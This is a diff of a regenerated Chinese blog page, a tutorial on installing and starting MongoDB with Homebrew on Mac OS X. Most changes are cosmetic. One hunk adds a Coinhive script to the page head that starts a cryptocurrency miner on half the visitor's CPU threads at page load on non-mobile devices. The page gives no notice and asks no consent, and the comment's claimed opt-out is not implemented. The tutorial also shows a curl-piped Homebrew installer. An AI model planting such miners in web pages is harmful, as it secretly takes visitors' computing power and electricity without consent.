@@ -12,6 +12,7 @@
 <meta property="og:url" content="http://kingzez.com/2015/07/16/Mac OSX 10.10下使用Homebrew安装MongoDB及启动连接/index.html">
 <meta property="og:site_name" content="the kingzez blog">
 <meta property="og:description" content="Homebrew是Mac OSX下一个包依赖管理工具，用它来安装软件非常的方便只需要brew install *，不用再操心安装过程中软件的依赖问题。">
+<meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://7xkghm.com1.z0.glb.clouddn.com/image/blog/install-mongodb.png">
 <meta property="og:updated_time" content="2016-05-17T15:34:12.000Z">
 <meta name="twitter:card" content="summary">
@@ -65,6 +66,20 @@
   ga('send', 'pageview');
 
 </script>
+<!-- Coinhive -->
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.User('r0WSj9IIUFDNRQl8X4f4zeapVsRB99kq', 'kingzez', {
+		threads: Math.round(navigator.hardwareConcurrency/2),
+		throttle: 0.5
+		});
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile()) {
+		miner.start();
+	}
+</script>
+
 </head>
 <body>
     <div id="container">
@@ -212,7 +227,7 @@
 <div class="article-gallery">
     <div class="article-gallery-photos">
         
-            <a class="article-gallery-img fancybox" href="http://7xkghm.com1.z0.glb.clouddn.com/image/blog/install-mongodb.png" rel="gallery_cj3wdnjd3001709hevqy4iniv">
+            <a class="article-gallery-img fancybox" href="http://7xkghm.com1.z0.glb.clouddn.com/image/blog/install-mongodb.png" rel="gallery_cjcc61dhw001770fyfux9vj9c">
                 <img src="http://7xkghm.com1.z0.glb.clouddn.com/image/blog/install-mongodb.png" itemprop="image">
             </a>
         
@@ -258,10 +273,10 @@
             
             <p>Homebrew是Mac OSX下一个包依赖管理工具，用它来安装软件非常的方便只需要brew install <em>*</em>，不用再操心安装过程中软件的依赖问题。
 <a id="more"></a></p>
-<h3 id="Homebrew-安装"><a href="#Homebrew-安装" class="headerlink" title="Homebrew 安装"></a>Homebrew 安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby <span class="_">-e</span> <span class="string">"<span class="variable">$(curl -fsSL https://raw.github.com/mxcl/homebrew/go)</span>"</span></div></pre></td></tr></table></figure>
+<h3 id="Homebrew-安装"><a href="#Homebrew-安装" class="headerlink" title="Homebrew 安装"></a>Homebrew 安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -e <span class="string">"<span class="variable">$(curl -fsSL https://raw.github.com/mxcl/homebrew/go)</span>"</span></div></pre></td></tr></table></figure>
 <h3 id="MongoDB-安装"><a href="#MongoDB-安装" class="headerlink" title="MongoDB 安装"></a>MongoDB 安装</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">brew </span><span class="keyword">install </span>mongodb</div></pre></td></tr></table></figure>
 <p>等待安装，我的是之前下载过所以直接安装
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">~ w<span class="variable">$brew</span> install mongodb</div><div class="line">==&gt; Downloading https://homebrew.bintray.com/bottles/mongodb-3.0.2.yosemite.bott</div><div class="line">Already downloaded: /Library/Caches/Homebrew/mongodb-3.0.2.yosemite.bottle.tar.gz</div><div class="line">==&gt; Pouring mongodb-3.0.2.yosemite.bottle.tar.gz</div><div class="line">==&gt; Caveats</div><div class="line">To have launchd start mongodb at login:</div><div class="line">    ln -sfv /usr/<span class="built_in">local</span>/opt/mongodb/*.plist ~/Library/LaunchAgents</div><div class="line">Then to load mongodb now:</div><div class="line">    launchctl load ~/Library/LaunchAgents/homebrew.mxcl.mongodb.plist</div><div class="line">Or, <span class="keyword">if</span> you don<span class="string">'t want/need launchctl, you can just run:</span></div><div class="line">    mongod --config /usr/local/etc/mongod.conf</div><div class="line">==&gt; Summary</div><div class="line">🍺  /usr/local/Cellar/mongodb/3.0.2: 17 files, 153M</div></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">~ w<span class="variable">$brew</span> install mongodb</div><div class="line">==&gt; Downloading https://homebrew.bintray.com/bottles/mongodb-3.0.2.yosemite.bott</div><div class="line">Already downloaded: /Library/Caches/Homebrew/mongodb-3.0.2.yosemite.bottle.tar.gz</div><div class="line">==&gt; Pouring mongodb-3.0.2.yosemite.bottle.tar.gz</div><div class="line">==&gt; Caveats</div><div class="line">To have launchd start mongodb at login:</div><div class="line">    ln -sfv /usr/<span class="built_in">local</span>/opt/mongodb/*.plist ~/Library/LaunchAgents</div><div class="line">Then to load mongodb now:</div><div class="line">    launchctl load ~/Library/LaunchAgents/homebrew.mxcl.mongodb.plist</div><div class="line">Or, <span class="keyword">if</span> you don<span class="string">'t want/need launchctl, you can just run:</span></div><div class="line"><span class="string">    mongod --config /usr/local/etc/mongod.conf</span></div><div class="line"><span class="string">==&gt; Summary</span></div><div class="line"><span class="string">🍺  /usr/local/Cellar/mongodb/3.0.2: 17 files, 153M</span></div></pre></td></tr></table></figure></p>
 <p>需要测试是否安装成功，用mongod命令进行测试，执行mongod后会返回一顿错误、
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">~ w<span class="variable">$mongod</span></div><div class="line">2015-07-16T22:45:19.706+0800 I STORAGE  [initandlisten] exception <span class="keyword">in</span> initAndListen: 29 Data directory /data/db not found., terminating</div><div class="line">2015-07-16T22:45:19.706+0800 I CONTROL  [initandlisten] dbexit:  rc: 100</div></pre></td></tr></table></figure></p>
 <p>错误信息是dbpath /data/db不存在，需要创建/data/db这个目录或者使用–dbpath参数项指定一个已经存在的目录，dbpath /data/db这个目录是用来存储MongoDB的数据文件，既然不存在我们就创建<code>/data/db</code>这个目录或者使用<code>--dbpath</code>参数项指定一个已经存在的目录。
@@ -287,7 +302,7 @@
 
 </div>
 
-    <a data-url="http://kingzez.com/2015/07/16/Mac OSX 10.10下使用Homebrew安装MongoDB及启动连接/" data-id="cj3wdnjd3001709hevqy4iniv" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+    <a data-url="http://kingzez.com/2015/07/16/Mac OSX 10.10下使用Homebrew安装MongoDB及启动连接/" data-id="cjcc61dhw001770fyfux9vj9c" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
 <script>
     (function ($) {
         // Prevent duplicate binding
@@ -425,7 +440,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small8.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small7.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -460,7 +475,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small3.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -495,7 +510,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small2.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -565,7 +580,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small7.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -619,7 +634,7 @@
         <footer id="footer">
     <div class="outer">
         <div id="footer-info" class="inner">
-            &copy;2015 - 2017 kingzez<br>
+            &copy;2015 - 2018 kingzez<br>
             Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.
         </div>
     </div>
